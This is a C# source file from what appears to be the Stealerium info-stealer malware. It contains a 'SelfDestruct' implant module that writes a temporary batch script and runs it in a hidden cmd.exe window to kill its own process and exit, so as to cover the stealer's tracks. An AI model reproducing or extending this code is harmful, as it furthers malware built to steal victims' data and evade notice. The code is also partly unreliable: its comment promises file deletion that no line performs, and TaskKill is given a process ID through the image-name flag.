using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Stealerium.Helpers;

namespace Stealerium.Modules.Implant
{
    internal sealed class SelfDestruct
    {
        /// <summary>
        ///     Delete file after first start
        /// </summary>
        public static void Melt()
        {
            // Paths
            var batch = Path.GetTempFileName() + ".bat";
            var currentPid = Process.GetCurrentProcess().Id;
            // Write batch
            using (var sw = File.AppendText(batch))
            {
                sw.WriteLine("chcp 65001");
                sw.WriteLine("TaskKill /F /IM " + currentPid);
                sw.WriteLine("Timeout /T 2 /Nobreak");
            }

            // Log
            Logging.Log("SelfDestruct : Running self destruct procedure...");
            // Start
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + batch,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            // Wait for exit
            Thread.Sleep(5000);
            Environment.FailFast(null);
        }
    }
}